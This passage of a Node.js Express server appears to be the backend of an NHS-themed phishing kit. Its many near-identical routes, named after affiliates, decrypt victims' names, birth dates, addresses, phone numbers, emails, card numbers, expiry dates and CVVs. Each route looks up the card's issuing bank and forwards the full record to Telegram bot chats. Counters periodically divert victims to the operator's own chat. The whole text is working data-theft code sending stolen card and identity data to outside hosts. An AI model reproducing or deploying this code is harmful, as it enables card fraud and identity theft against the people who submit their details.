          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMason:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=NHS:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/@kworthy12", cors());

app.post("/@kworthy12", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS4:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1955185965&text=NHS4:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/Tarrifi", cors());

app.post("/Tarrifi", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSTarrifi:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/littlewaynesjobs", cors());

app.post("/littlewaynesjobs", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSWayne:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1532191460&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/sendKelvFriendRes", cors());

app.post("/sendKelvFriendRes", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5231391571&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

let fpaysC = 10;

app.options("/sendFpays2", cors());

app.post("/sendFpays2", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        fpaysC = 6;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSFPays:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NHS:\n${originalText}`
        );
        fpaysC += 1;
      }

      res.send("Update Completed");
    });
});

let masterboy = 0;

app.options("/M4STERB0Y", cors());

app.post("/M4STERB0Y", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (masterboy == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        masterboy = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMasterboy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=NHS:\n${originalText}`
        );
        masterboy += 1;
      }

      res.send("Update Completed");
    });
});

let skiii719 = 0;

app.options("/skiii719", cors());

app.post("/skiii719", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

let Tcapz688 = 0;

app.options("/Tcapz688", cors());

app.post("/Tcapz688", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSFZ:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1612469030&text=NHS:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/actualTcapz688", cors());

app.post("/actualTcapz688", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSSkii:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=NHS:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

let mannyman789 = 0;

app.options("/mannyman789", cors());

app.post("/mannyman789", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mannyman789 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mannyman789 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSManny:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=NHS:\n${originalText}`
        );
        mannyman789 += 1;
      }

      res.send("Update Completed");
    });
});

let mulligang135 = 0;

app.options("/mulligang135", cors());

app.post("/mulligang135", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = `${req.body.userAgent}`;
  ip = `${req.body.ip}`;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mulligang135 == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mulligang135 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMulli:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1990774394&text=NHS:\n${originalText}`
        );
        mulligang135 += 1;
      }

      res.send("Update Completed");
    });
});

let lingypack = 0;

app.options("/lingypackNHS", cors());

app.post("/lingypackNHS", (req, res) => {
